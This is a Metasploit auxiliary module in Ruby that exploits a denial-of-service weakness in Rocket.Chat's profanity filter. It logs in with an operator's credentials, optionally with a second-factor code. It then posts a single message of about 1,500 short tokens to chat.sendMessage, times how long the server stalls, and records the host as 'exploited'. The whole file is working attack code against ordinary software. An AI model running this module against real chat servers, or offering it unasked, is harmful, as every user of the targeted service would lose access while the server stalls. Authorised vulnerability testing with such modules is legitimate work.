class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat profanity-filter denial-of-service (VULN-045)',
        'Description' => %q{
          Rocket.Chat's profanity filter runs a per-token, per-word regex scan inline
          on chat.sendMessage, so one member stalls the whole server for seconds per
          message when Message_AllowBadWordsFilter is on. This module signs in with
          the operator's credentials, posts a message of TOKENS short tokens and
          reports the measured stall. The operator sets TOKENS and the room; the
          module sends one bounded message and creates nothing lasting.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/chat.sendMessage']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('ROOMID', [true, 'A room the account may post into', 'GENERAL']),
      OptString.new('TOKENS', [true, 'Number of short tokens in the message', '1500']),
      OptString.new('THRESHOLD', [true, 'Seconds above which the host is judged vulnerable', '1.5']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    unless authenticate
      fail_with(Failure::NoAccess, 'Could not sign in with the credentials given.')
    end

    res = timed_send(datastore['TOKENS'].to_i)
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = @elapsed > datastore['THRESHOLD'].to_f
    fail_with(Failure::NotVulnerable, 'VULN-045: the attack did not land') unless hit

    print_good("#{peer} - VULN-045: exploited")
    print_good("#{peer} - one message stalled the server for %.1f s (threshold %.1f s)" % [@elapsed, datastore['THRESHOLD'].to_f])
    print_status('  the scan runs inline on the request path, so every other request waits the same time')
    path = store_loot('blue_spider.vuln_045', 'text/plain', rhost, res.body.to_s, 'vuln_045.txt', 'VULN-045 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-045 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def timed_send(tokens)
    msg = (['a'] * tokens).join(' ')
    t0 = Time.now
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id },
      'data' => { 'message' => { 'rid' => datastore['ROOMID'], 'msg' => msg } }.to_json
    }, 120)
    @elapsed = Time.now - t0
    res
  end
end
